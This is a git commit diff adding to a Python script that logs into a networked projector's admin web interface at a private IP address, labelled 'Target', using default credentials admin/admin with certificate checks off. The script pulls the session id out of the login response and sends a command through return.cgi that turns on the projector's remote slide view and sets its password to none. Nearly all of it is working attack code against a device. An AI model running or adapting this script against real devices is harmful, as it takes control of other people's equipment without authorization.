2599020e46f4a22a9e82f76b0dbb6744bece3443
at <at@localhost.localdomain>
2019-09-18 20:32:03 -0400

    Added Control of Remote View

--- loginAdmin.py
+++ loginAdmin.py
@@ -14,13 +14,17 @@ import requests
 
 print("Trying to login now")
 
+#Admin Creds
 username="admin"
 password="admin"
 
+#Target
 host="10.103.36.87"
 
+#URL of Projector
 url="https://" + host + "/cgi-bin/login.cgi?lang=en&src=AwLoginAdmin.html"
 
+#POST Data
 data = {
     'login': 'admin',
     'account': 'admin',
@@ -30,9 +34,18 @@ data = {
 
 }
 
+#Send Login Request
 login = requests.post(url = url, data = data, verify=False)
-print(login.text)
+
+#Pull Out Cookie So You Can Keep Making Requests
 cookieStart=login.text.split("document.write(\"<form name=\'form0\' action=\'/cgi-bin/reboot.cgi?lang=en&")
 cookieMid=cookieStart[1].split("'")
 cookie=cookieMid[0]
 print(cookie)
+
+#Turn Remove View Off
+url = "https://"+ host + "/cgi-bin/return.cgi"
+data = {
+    "command":"<Send><seid>"+ cookie +"</seid><name>SLIDES_ALWAYS_SEND</name><value>1</value><name>SLIDES_PASSWORD</name><value>0</value><name>SLIDES_SECOND</name><value>0</value></Send>"
+}
+remoteViewOn = requests.post(url=url,data=data, verify=False)
